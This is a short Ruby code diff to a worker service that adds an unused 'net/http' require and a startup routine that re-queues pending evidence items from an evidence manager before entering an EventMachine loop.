@@ -17,6 +17,7 @@ require 'rcs-common/evidence_manager'
 
 # form System
 require 'digest/md5'
+require 'net/http'
 require 'optparse'
 
 require 'eventmachine'
@@ -105,11 +106,22 @@ class Worker
   
   attr_reader :type, :audio_processor
   
+  def resume
+    instances = EvidenceManager.instances
+    instances.each do |instance|
+      trace :info, "Resuming remaining evidences for #{instance}"
+      ids = EvidenceManager.evidence_ids instance
+      ids.each {|id| QueueManager.instance.queue(instance, id)}
+    end
+  end
+  
   def setup(port = 5150)
     
     # main EventMachine loop
     begin
-      
+
+      resume
+
       # all the events are handled here
       EM::run do
         # if we have epoll(), prefer it over select()
